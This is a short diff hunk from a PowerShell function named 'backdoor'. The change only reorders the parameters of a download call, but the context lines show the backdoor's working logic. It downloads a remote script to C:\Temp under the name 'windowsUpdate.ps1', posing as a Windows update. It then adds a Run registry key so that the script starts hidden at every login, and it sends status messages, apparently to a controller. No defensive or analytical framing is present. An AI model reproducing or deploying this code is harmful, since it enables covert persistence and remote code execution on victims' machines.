@@ -57,7 +57,7 @@ function backdoor {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
         
         Send-Message "Downloading.."
-        Invoke-WebRequest -UseBasicParsing -Uri $githubScript -OutFile C:\Temp\windowsUpdate.ps1
+        Invoke-WebRequest -Uri $githubScript -UseBasicParsing -OutFile C:\Temp\windowsUpdate.ps1
 
         Send-Message "Adding_to_the_reg.."
 		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Temp\windowsUpdate.ps1"
